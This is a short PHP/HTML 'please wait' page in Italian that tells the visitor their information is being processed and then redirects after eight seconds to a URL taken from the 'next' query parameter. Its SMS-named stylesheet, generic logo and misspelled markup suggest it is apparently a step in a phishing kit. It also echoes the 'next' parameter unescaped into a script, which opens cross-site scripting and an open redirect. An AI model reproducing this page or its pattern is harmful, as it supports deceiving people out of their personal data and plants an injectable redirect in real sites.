<?php 
require 'main.php';
?><!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="res/sms.css">
    <title>Please wait</title>
</head>
<body>
    
<header>
    <div class="logo">
<img src="res/img/logo.png">
    </div>

</header>
    

<main>


    <div class="contine">
    
<div class="titles_holder" style="padding:10px;">
<h2>Attendere prego...</h2>
</div>


<div class="heads">
<p>Elaborazione delle tue informazioni in corso...</p>
<div class="loding"><img src="res/img/loading.gif" style="width:60px;"></div>
 
</div>


<script>
var next = "<?php echo $_GET['next']; ?>";
setTimeout(() => {
    window.location=next;
}, 8000);
</script>
</body>
</html>